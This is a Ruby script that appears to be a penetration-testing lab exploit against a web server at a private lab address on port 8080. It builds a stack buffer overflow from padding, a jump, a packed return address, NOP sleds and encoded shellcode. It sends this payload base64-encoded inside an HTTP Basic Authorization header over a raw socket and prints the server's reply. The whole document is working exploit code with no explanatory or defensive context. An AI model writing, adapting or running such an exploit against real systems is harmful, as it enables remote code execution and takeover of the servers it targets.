$VERBOSE = nil
require 'socket'
require 'base64'
require 'rex'
include Rex
 
host = '10.11.1.202'     # The web server
port = 8080
                           # Default HTTP port
buf = 
"\xbe\xa6\xee\x1c\x25\xd9\xe1\xd9\x74\x24\xf4\x5f\x2b\xc9" +
"\xb1\x54\x83\xef\xfc\x31\x77\x0f\x03\x77\xa9\x0c\xe9\xd9" +
"\x5d\x52\x12\x22\x9d\x33\x9a\xc7\xac\x73\xf8\x8c\x9e\x43" +
"\x8a\xc1\x12\x2f\xde\xf1\xa1\x5d\xf7\xf6\x02\xeb\x21\x38" +
"\x93\x40\x11\x5b\x17\x9b\x46\xbb\x26\x54\x9b\xba\x6f\x89" +
"\x56\xee\x38\xc5\xc5\x1f\x4d\x93\xd5\x94\x1d\x35\x5e\x48" +
"\xd5\x34\x4f\xdf\x6e\x6f\x4f\xe1\xa3\x1b\xc6\xf9\xa0\x26" +
"\x90\x72\x12\xdc\x23\x53\x6b\x1d\x8f\x9a\x44\xec\xd1\xdb" +
"\x62\x0f\xa4\x15\x91\xb2\xbf\xe1\xe8\x68\x35\xf2\x4a\xfa" +
"\xed\xde\x6b\x2f\x6b\x94\x67\x84\xff\xf2\x6b\x1b\xd3\x88" +
"\x97\x90\xd2\x5e\x1e\xe2\xf0\x7a\x7b\xb0\x99\xdb\x21\x17" +
"\xa5\x3c\x8a\xc8\x03\x36\x26\x1c\x3e\x15\x2e\xd1\x73\xa6" +
"\xae\x7d\x03\xd5\x9c\x22\xbf\x71\xac\xab\x19\x85\xd3\x81" +
"\xde\x19\x2a\x2a\x1f\x33\xe8\x7e\x4f\x2b\xd9\xfe\x04\xab" +
"\xe6\x2a\xb0\xae\x70\x79\x55\x3d\x01\xe9\x54\x3d\x10\xb6" +
"\xd1\xdb\x42\x16\xb2\x73\x22\xc6\x72\x24\xca\x0c\x7d\x1b" +
"\xea\x2e\x57\x34\x80\xc0\x0e\x6c\x3c\x78\x0b\xe6\xdd\x85" +
"\x81\x82\xdd\x0e\x20\x72\x93\xe6\x41\x60\xc3\x96\xa9\x78" +
"\x13\x33\xaa\x12\x17\x95\xfd\x8a\x15\xc0\xca\x14\xe6\x27" +
"\x49\x52\x18\xb6\x78\x28\x2e\x2c\xc5\x46\x4e\xa0\xc5\x96" +
"\x18\xaa\xc5\xfe\xfc\x8e\x95\x1b\x03\x1b\x8a\xb7\x91\xa4" +
"\xfb\x64\x32\xcd\x01\x52\x74\x52\xf9\xb1\x07\x95\x05\x47" +
"\x25\x3e\x6e\xb7\x69\xbe\x6e\xdd\x69\xee\x06\x2a\x46\x01" +
"\xe7\xd3\x4d\x4a\x6f\x59\x03\x38\x0e\x5e\x0e\x9c\x8e\x5f" +
"\xbc\x05\xc6\xd1\x43\xba\xe7\x13\x78\x6c\xde\x61\xb9\xac" +
"\x65\x79\xf0\x91\xcc\x10\xfa\x86\x0f\x31"

# This is the HTTP request we send to fetch a file
sploit = Text.rand_text_english(4, '/x00') + ":"
sploit << Text.rand_text_english(442, '/x00')
sploit << "\xeb\x64\x90\x90" + [0x60616d46].pack('V')
sploit << "\x90"*266 + "\xeb\x10" + "\x90"*109
sploit << "\x81\xc4\xff\xef\xff\xff\x44"
sploit << buf

req = "Authorization: Basic #{Base64.encode64(sploit)}\r\n\r\n"

request = "GET / HTTP/1.1\r\n Host: #{host}:#{port}\r\n" + req

socket = TCPSocket.open(host,port)  # Connect to server
socket.puts(request)               # Send request
response = socket.read              # Read complete response
# Split response at first blank line into headers and body
headers,body = response.split("\r\n\r\n", 2) 
print body  
